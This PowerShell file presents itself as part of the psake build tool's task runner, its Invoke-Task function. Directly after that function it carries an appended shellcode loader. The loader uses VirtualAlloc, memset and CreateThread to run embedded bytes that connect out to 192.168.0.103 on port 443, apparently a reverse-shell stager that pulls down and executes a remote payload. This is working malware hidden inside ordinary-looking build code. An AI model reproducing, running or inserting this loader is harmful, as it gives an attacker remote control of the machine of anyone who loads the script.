function Invoke-Task {[CmdletBinding()]param([Parameter(Mandatory = $true)][string]$taskName)Assert $taskName ($msgs.error_invalid_task_name)$taskKey = $taskName.ToLower()$currentContext = $psake.context.Peek()if ($currentContext.aliases.Contains($taskKey)) {$taskName = $currentContext.aliases.$taskKey.Name$taskKey = $taskName.ToLower()}Assert ($currentContext.tasks.Contains($taskKey)) ($msgs.error_task_name_does_not_exist -f $taskName)if ($currentContext.executedTasks.Contains($taskKey))  { return }Assert (!$currentContext.callStack.Contains($taskKey)) ($msgs.error_circular_reference -f $taskName)$currentContext.callStack.Push($taskKey)$task = $currentContext.tasks.$taskKey$precondition_is_valid = & $task.Preconditionif (!$precondition_is_valid) {WriteColoredOutput ($msgs.precondition_was_false -f $taskName) -foregroundcolor Cyan} else {if ($taskKey -ne 'default') {if ($task.PreAction -or $task.PostAction) {Assert ($null -ne $task.Action) ($msgs.error_missing_action_parameter -f $taskName)}if ($task.Action) {$stopwatch = new-object System.Diagnostics.Stopwatchtry {foreach($childTask in $task.DependsOn) {Invoke-Task $childTask}$stopwatch.Start()$currentContext.currentTaskName = $taskNametry {& $currentContext.taskSetupScriptBlock @($task)try {if ($task.PreAction) {& $task.PreAction}if ($currentContext.config.taskNameFormat -is [ScriptBlock]) {$taskHeader = & $currentContext.config.taskNameFormat $taskName} else {$taskHeader = $currentContext.config.taskNameFormat -f $taskName}WriteColoredOutput $taskHeader -foregroundcolor Cyanforeach ($variable in $task.requiredVariables) {Assert ((Test-Path "variable:$variable") -and ($null -ne (Get-Variable $variable).Value)) ($msgs.required_variable_not_set -f $variable, $taskName)}& $task.Action} finally {if ($task.PostAction) {& $task.PostAction}}} catch {$task.Success        = $false$task.ErrorMessage   = $_$task.ErrorDetail    = $_ | Out-String$task.ErrorFormatted = FormatErrorMessage $_throw $_ } finally {& $currentContext.taskTearDownScriptBlock $task}} catch {if ($task.ContinueOnError) {"-"*70WriteColoredOutput ($msgs.continue_on_error -f $taskName,$_) -foregroundcolor Yellow"-"*70[void]$currentContext.callStack.Pop()}  else {throw $_}} finally {$task.Duration = $stopwatch.Elapsed}} else {foreach($childTask in $task.DependsOn) {Invoke-Task $childTask}}} else {foreach($childTask in $task.DependsOn) {Invoke-Task $childTask}}Assert (& $task.Postcondition) ($msgs.postcondition_failed -f $taskName)}$poppedTaskKey = $currentContext.callStack.Pop()Assert ($poppedTaskKey -eq $taskKey) ($msgs.error_corrupt_callstack -f $taskKey,$poppedTaskKey)$currentContext.executedTasks.Push($taskKey)}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};